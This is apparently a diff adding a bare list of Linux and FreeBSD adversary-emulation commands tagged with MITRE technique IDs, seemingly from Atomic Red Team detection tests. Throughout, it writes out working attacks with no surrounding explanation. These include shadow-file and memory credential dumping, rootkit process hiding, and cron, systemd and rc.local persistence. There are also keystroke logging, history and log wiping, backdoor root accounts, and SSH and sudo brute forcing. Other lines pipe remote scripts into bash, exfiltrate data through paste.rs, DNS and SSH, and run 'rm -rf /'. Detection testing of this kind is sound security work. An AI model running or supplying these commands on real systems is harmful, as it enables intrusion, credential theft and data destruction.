@@ -1,0 +1,863 @@
+sh /tmp/T1003.007.sh
+PID=$(pgrep -n -f "T1003.007")
+HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+grep -i "PASS" "/tmp/T1003.007.bin"
+MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
+MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
+MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
+strings "/tmp/T1003.007.bin" | grep -i PASS
+PYTHON=$(which python || which python3 || which python2)
+sudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt
+cat /tmp/T1003.007Test3.txt
+sudo cat /etc/shadow > /tmp/T1003.008.txt
+cat /tmp/T1003.008.txt
+sudo cat /etc/master.passwd > /tmp/T1003.008.txt
+cat /etc/passwd > /tmp/T1003.008.txt
+unamestr=$(uname)
+if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; fi
+testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }
+[ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd
+testcat /etc/passwd
+testcat /etc/shadow
+cd $HOME
+curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+chmod +x sqlite_dump.sh
+find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo "/etc/init.d not present on this system"; fi
+echo
+ls -ld /etc/rc*.d 2>/dev/null || echo "No /etc/rc*.d directories found"
+sudo modprobe T1014
+echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload
+/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
+sudo modprobe diamorphine
+ping -c 10 localhost >/dev/null & TARGETPID="$!"
+ps $TARGETPID
+kill -31 $TARGETPID
+ps $TARGETPID || echo "process ${TARGETPID} hidden"
+ping -c 4 8.8.8.8
+if [ "$(uname)" = 'FreeBSD' ]; then cmd="netstat -Sp tcp"; else cmd="netstat -ant"; fi;
+if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
+if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
+if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
+if [ -x "$(command -v netstat)" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
+arp -a | grep -v '^?'
+for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo "192.168.1.$ip UP" || : ; done
+ip neighbour show
+ip route show
+netstat -r | grep default
+ip tcp_metrics show |grep --invert-match "^127\."
+dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes
+dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary #adds high-quality random data
+dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data
+truncate -s +1 /tmp/evil-binary #adds a byte to the file size
+echo '#!/bin/bash' > /tmp/art_payload.sh
+echo 'echo "T1027.013: Payload extracted from encrypted ZIP"' >> /tmp/art_payload.sh
+echo 'echo "Hostname: $(hostname)"' >> /tmp/art_payload.sh
+echo 'echo "User: $(whoami)"' >> /tmp/art_payload.sh
+echo 'uname -a' >> /tmp/art_payload.sh
+cd /tmp && zip -P "infected" art_encrypted.zip art_payload.sh
+rm /tmp/art_payload.sh
+unzip -P "infected" -o /tmp/art_encrypted.zip -d /tmp/
+bash /tmp/art_payload.sh
+if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64decode -r"; else cmd="base64 -d"; fi;
+cat /tmp/encoded.dat | $cmd > /tmp/art.sh
+chmod +x /tmp/art.sh
+/tmp/art.sh
+cd /tmp/T1030; split -b 5000000 T1030_urandom
+ls -l /tmp/T1030
+users
+cp /bin/sh /tmp/crond;
+echo 'sleep 5' | /tmp/crond
+/tmp/T1036_004_prctl_rename & ps
+TMP=`ps | grep totally_legit`
+if [ -z "${TMP}" ] ; then echo "renamed process NOT FOUND in process list" && exit 1; fi
+exit 0
+eval '(while true; do :; done) &'
+echo $! > /tmp/evil_pid.txt
+random_kernel_pid=$(ps -ef | grep "\[.*\]" | awk '{print $2}' | shuf -n 1)
+sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)
+mkdir $HOME/...
+cp $(which sh) $HOME/...
+$HOME/.../sh -c "echo Hello from the Atomic Red Team test T1036.005#1"
+mkdir -p /tmp/atomic-test-T1036.006
+cd /tmp/atomic-test-T1036.006
+mkdir -p 'testdirwithspaceend '
+[ "$(uname)" = 'FreeBSD' ] && /bin/echo "#\!/bin/sh" > "testdirwithspaceend /init " && echo 'echo "print(\"running T1035.006 with space after filename to masquerade init\")" | python3.9' >> "testdirwithspaceend /init " && echo "exit" >> "testdirwithspaceend /init " || /usr/bin/echo -e "%d\na\n#!/usr/bin/perl\nprint \"running T1035.006 with space after filename to masquerade init\\n\";\nqx/cp \/usr\/bin\/perl 'init '/;\nqx/'.\/init ' -e 'sleep 5'/;\n.\nwq\n" | ed 'testdirwithspaceend /init ' >/dev/null
+chmod +x 'testdirwithspaceend /init '
+'./testdirwithspaceend /init '
+echo '#!/bin/sh' > /tmp/report.pdf.sh
+echo 'echo "Simulating malicious double extension execution"' >> /tmp/report.pdf.sh
+chmod +x /tmp/report.pdf.sh
+/tmp/report.pdf.sh
+echo '#!/bin/sh' > /tmp/image.png
+echo 'echo "Running script masked as PNG"' >> /tmp/image.png
+sh /tmp/image.png
+filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
+printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
+echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common
+printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
+sudo chmod +x /etc/rc.common
+filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
+[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local
+echo "\npython3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local
+printf 'exit 0' | sudo tee -a /etc/rc.local
+sudo chmod +x /etc/rc.local
+tcpdump -c 5 -nnni ens33
+tshark -c 5 -i ens33
+tcpdump -c 5 -nnni em0
+tshark -c 5 -i em0
+sudo /tmp/t1040_freebsd_pcapdemo -i em0 -t 3
+sudo /tmp/t1040_freebsd_pcapdemo -f -i em0 -t 3
+sudo /tmp/t1040_linux_pcapdemo -a -t 3
+sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3
+sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3
+sudo /tmp/t1040_linux_pcapdemo -a -f -t 3
+for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done
+sudo nmap -sS 192.168.1.0/24 -p 80
+telnet 192.168.1.1 80
+nc -nv 192.168.1.1 80
+docker run --name t1046_container --rm -d -t t1046
+docker exec t1046_container /scan.sh
+nmap -Pn -sV -p 0-65535 127.0.0.1
+wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
+dig @8.8.8.8 -p 53 $(echo "this is a secret info" | base64).google.com
+if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi
+netstat
+who -a
+sockstat -4
+sockstat -6 2>/dev/null || true
+sockstat -l 2>/dev/null || true
+echo "echo Hello from Atomic Red Team" | at now + 1 minute
+kubectl run atomic-at-schedule --image=ubuntu --restart=Never --attach --rm -i -- bash -lc "apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo 'echo Hello from Atomic Red Team' | at now + 1 minute && at -l"
+crontab -l > /tmp/notevil
+echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
+echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/persistevil
+echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.hourly/persistevil
+echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.monthly/persistevil
+echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.weekly/persistevil
+echo "echo '*/5 * * * * root echo "Hello from Atomic Red Team"' > /tmp/atomic.log" > /etc/cron.d/persistevil
+echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" >> /var/spool/cron/crontabs/persistevil
+echo "[Unit]" > /etc/systemd/system/art-timer.service
+echo "Description=Atomic Red Team Systemd Timer Service" >> /etc/systemd/system/art-timer.service
+echo "[Service]" >> /etc/systemd/system/art-timer.service
+echo "Type=simple" >> /etc/systemd/system/art-timer.service
+echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> /etc/systemd/system/art-timer.service
+echo "[Install]" >> /etc/systemd/system/art-timer.service
+echo "WantedBy=multi-user.target" >> /etc/systemd/system/art-timer.service
+echo "[Unit]" > /etc/systemd/system/art-timer.timer
+echo "Description=Executes Atomic Red Team Systemd Timer Service" >> /etc/systemd/system/art-timer.timer
+echo "Requires=art-timer.service" >> /etc/systemd/system/art-timer.timer
+echo "[Timer]" >> /etc/systemd/system/art-timer.timer
+echo "Unit=art-timer.service" >> /etc/systemd/system/art-timer.timer
+echo "OnCalendar=*-*-* *:*:00" >> /etc/systemd/system/art-timer.timer
+echo "[Install]" >> /etc/systemd/system/art-timer.timer
+echo "WantedBy=timers.target" >> /etc/systemd/system/art-timer.timer
+systemctl start art-timer.timer
+systemctl enable art-timer.timer
+systemctl daemon-reload
+systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
+systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
+kubectl get cronjobs -n default
+kubectl create -f src/cronjob.yaml -n default
+if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
+if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
+sudo touch /tmp/password-auth.bk
+enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session required pam_tty_audit.so
+PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+tail /var/log/syslog
+PS2=`logger -t "$USER" -f ~/.sh_history`
+$PS2
+tail /var/log/messages
+trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> /tmp/.keyboard.log' DEBUG
+cat /tmp/.keyboard.log
+cp -v /etc/pam.d/sshd /tmp/
+echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" >> /etc/pam.d/sshd
+systemctl restart sshd
+systemctl restart auditd
+ssh ubuntu@localhost
+whoami
+sudo su
+exit
+auditctl -a always,exit -F arch=b64 -S execve -k CMDS
+auditctl -a always,exit -F arch=b32 -S execve -k CMDS
+whoami; ausearch -i --start now
+ps >> /tmp/loot.txt
+ps aux >> /tmp/loot.txt
+sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
+sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
+sh /tmp/art.sh
+curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+TMPFILE=$(mktemp)
+echo "id" > $TMPFILE
+bash $TMPFILE
+echo $0
+if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi
+if $(printenv SHELL >/dev/null); then printenv SHELL; fi
+cat /etc/shells
+for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done
+[ "$(uname)" = 'FreeBSD' ] && encodecmd="b64encode -r -" && decodecmd="b64decode -r" || encodecmd="base64 -w 0" && decodecmd="base64 -d"
+ART=$(echo -n "id" | $encodecmd)
+echo -n "$ART" | $decodecmd |/bin/bash
+unset ART
+[ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
+cat /etc/passwd |grep ^art
+chsh -s /bin/sh art
+export ART='echo "Atomic Red Team was here... T1059.004"'
+echo $ART |/bin/sh
+cd /tmp
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash
+ls -la /tmp/art.txt
+uname -srm
+awk 'BEGIN {system("/bin/sh &")}'
+echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1 cpan
+busybox sh &
+sudo emacs -Q -nw --eval '(term "/bin/sh &")'
+which_python=$(which python || which python3 || which python3.9 || which python2)
+$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+echo 'import requests' > T1059.006.py
+echo 'import os' >> T1059.006.py
+echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+echo 'session = requests.session()' >> T1059.006.py
+echo 'source = session.get(url).content' >> T1059.006.py
+echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+echo 'fd.write(source)' >> T1059.006.py
+echo 'fd.close()' >> T1059.006.py
+echo 'os.system(malicious_command)' >> T1059.006.py
+$which_python T1059.006.py
+$which_python -c 'import py_compile; py_compile.compile("T1059.006.py", "T1059.006.pyc")'
+$which_python T1059.006.pyc
+$which_python -c "import pty;pty.spawn('/bin/sh')"
+$which_python -c "import pty;pty.spawn('/bin/bash')"
+if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
+if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
+if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
+if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
+if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
+cat /etc/group
+docker run --name t1069_container --rm -d -t t1069
+docker exec t1069_container ./test.sh
+ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=com" "(objectClass=group)" -s sub -a always -z 1000 dn
+rm ~/.bash_history
+echo "" > ~/.bash_history
+cat /dev/null > ~/.bash_history
+ln -sf /dev/null ~/.bash_history
+truncate -s0 ~/.bash_history
+unset HISTFILE
+export HISTFILESIZE=0
+history -c
+set +o history
+echo 'set +o history' >> ~/.bashrc
+. ~/.bashrc
+hostname
+sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname
+docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log
+rm -f /tmp/victim-files/T1070.004-test.txt
+rm -rf /tmp/victim-folder
+shred -u /tmp/victim-shred.txt
+[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
+touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
+touch -m -t 197001010000.00 /tmp/T1070.006-modification.txt
+NOW=$(date +%m%d%H%M%Y)
+date 010100001971
+touch /tmp/T1070.006-creation.txt
+date "$NOW"
+stat /tmp/T1070.006-creation.txt
+touch /tmp/T1070.006-reference.txt
+touch -acmr /bin/sh /tmp/T1070.006-reference.txt
+mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ "$(basename "$file")" != "copy" ]; then cp -R "$file" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*
+mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ "$(basename "$file")" != "copy" ]; then cp -R "$file" /var/spool/mail/copy/; if [ -f "/var/spool/mail/copy/$(basename "$file")" ]; then echo "Modification for Atomic Red Test" >> "/var/spool/mail/copy/$(basename "$file")"; fi; fi; done
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > /tmp/T1074.001_discovery.log
+password=$(openssl passwd -1 art)
+([ "$(uname)" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))
+su art -c "whoami; exit"
+useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art
+usermod --lock art
+usermod --expiredate "1" art
+usermod --unlock art
+usermod --expiredate "99999" art
+su -c whoami art
+pw useradd art -g wheel -s /bin/sh
+echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0
+pw lock art
+pw usermod art -e +1d
+pw unlock art
+pw user mod art -e +99d
+su art
+cat /etc/passwd |grep nobody
+chsh --shell /bin/bash nobody
+usermod --password $(openssl passwd -1 nobody) nobody
+su -c "whoami" nobody
+pw usermod nobody -s /bin/sh
+echo $(openssl passwd -1 art) | pw mod user nobody -h 0
+su nobody
+uname -a >> /tmp/T1082.txt
+if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi
+if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi
+if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi
+if [ -f /etc/os-release ]; then cat /etc/os-release >> /tmp/T1082.txt; fi
+uptime >> /tmp/T1082.txt
+cat /tmp/T1082.txt 2>/dev/null
+if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
+if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi
+if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi
+if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi
+if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi
+if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi
+if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi
+if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi
+sudo lsmod | grep -i "vboxsf\|vboxguest"
+sudo lsmod | grep -i "vmw_baloon\|vmxnet"
+sudo lsmod | grep -i "xen-vbd\|xen-vnif"
+sudo lsmod | grep -i "virtio_pci\|virtio_net"
+sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
+kldstat | grep -i "vmm"
+kldstat | grep -i "vbox"
+lsmod
+kmod list
+grep vmw /proc/modules
+kldstat
+kldstat | grep vmm
+ls -a >> /tmp/T1083.txt
+if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;
+file */* *>> /tmp/T1083.txt
+cat /tmp/T1083.txt 2>/dev/null
+find . -type f
+ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
+locate *
+which sh
+cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
+if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
+find . -type f -iname *.pdf >> /tmp/T1083.txt
+cat /tmp/T1083.txt
+find . -type f -name ".*"
+findmnt -t nfs
+cat /etc/passwd > /tmp/T1087.001.txt
+cat /tmp/T1087.001.txt
+if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > /tmp/T1087.001.txt; fi;
+if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > /tmp/T1087.001.txt; fi;
+grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt
+grep '*:0:' /etc/passwd >> /tmp/T1087.001.txt
+cat /tmp/T1087.001.txt 2>/dev/null
+username=$(id -u -n) && lsof -u $username
+[ "$(uname)" = 'FreeBSD' ] && cmd="lastlogin" || cmd="lastlog"
+$cmd > /tmp/T1087.001.txt
+groups
+ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=test" -s sub -a always -z 1000 dn
+ldapdomaindump -u domain\user -p password 127.0.0.1 -o /tmp/T1087
+export http_proxy=127.0.0.1:3128
+curl http://google.com
+[ "$(uname)" = 'FreeBSD' ] && sysrc tor_enable="YES" && service tor start || sudo systemctl start tor
+if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;
+STAGE_URL=$(curl -s -X POST -d "echo Simulated host discovery output" "https://paste.rs")
+OUTPUT=$(curl -s "$STAGE_URL" | sh 2>&1)
+EXFIL_URL=$(echo "$OUTPUT" | curl -s -X POST --data-binary @- "https://paste.rs")
+curl -s "$EXFIL_URL"
+rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files
+rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files
+scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/
+scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/
+sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'
+sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/
+timeout --preserve-status 1 whois -h localhost -p 8443 "Hello from Atomic Red Team test T1105" > /tmp/T1105.whois.out
+curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh
+kubectl run atomic-insecure-curl --image=curlimages/curl --restart=Never --rm -it -- curl -ksL https://malicious-apt.com
+useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
+su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
+useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash
+pw adduser art -g wheel -s /bin/sh
+echo "password123" | pw usermod art -h 0
+for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
+xwd -root -out /tmp/T1113_desktop.xwd
+xwud -in /tmp/T1113_desktop.xwd
+import -window root /tmp/T1113_desktop.png
+apt install xclip -y
+history | tail -n 30 | xclip -sel clip
+xclip -o > history.txt
+date
+echo -n 111-11-1111 | base64
+curl -XPOST MTExLTExLTExMTE=.redcanary.com
+echo -n 111-11-1111 | b64encode -r -
+useradd -M -N -r -s /bin/bash -c evil_account evil_user
+pw useradd evil_user -s /usr/sbin/nologin -d /nonexistent -c evil_account
+useradd -g 0 -M -d /root -s /bin/bash butter
+if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "butter:BetterWithButter" | sudo chpasswd; else echo "BetterWithButter" | passwd --stdin butter; fi;
+pw useradd butter -g 0 -d /root -s /bin/sh
+echo "BetterWithButter" | pw usermod butter -h 0
+kubectl run atomic-linux-useradd --image=alpine --restart=Never --rm -it -- sh -lc 'adduser -D evil_user && id evil_user'
+echo "dn: CN=Admin User,CN=Users,DC=example,DC=test\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@example.test\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test" > tempadmin.ldif
+echo ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif
+ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif
+echo "dn: cn=Atomic User, cn=Users,dc=example,dc=test\nobjectClass: person\ncn: Atomic User\nsn: User" > tempadmin.ldif
+echo ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif
+ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif
+ENCODED=$(python3 -c 'import base64;enc=base64.b64encode("Hello from Atomic Red Team test T1140!".encode());print(enc.decode())')
+python3 -c "import base64;dec=base64.b64decode(\"$ENCODED\");print(dec.decode())"
+python3 -c "import base64 as d;dec=d.b64decode(\"$ENCODED\");print(dec.decode())"
+python3 -c "from base64 import b64decode;dec=b64decode(\"$ENCODED\");print(dec.decode())"
+python3 -c "from base64 import b64decode as d;dec=d(\"$ENCODED\");print(dec.decode())"
+echo $ENCODED | python3 -c "import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"
+echo $ENCODED > /tmp/T1140.encoded && python3 -c "import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())"
+ENCODED=$(perl -e "use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));")
+perl -le "use MIME::Base64;print(decode_base64('$ENCODED'));"
+echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
+echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,"<","/tmp/T1140.encoded");print(decode_base64(<$f>));'
+ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64)
+printf $ENCODED | base64 -d
+echo $ENCODED | base64 -d
+echo $(echo $ENCODED) | base64 -d
+echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d
+echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d
+bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
+ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | b64encode -r -)
+printf $ENCODED | b64decode -r
+echo $ENCODED | b64decode -r
+echo $(echo $ENCODED) | b64decode -r
+echo $ENCODED > /tmp/T1140.encoded && b64encode -r /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && b64decode -r < /tmp/T1140.encoded
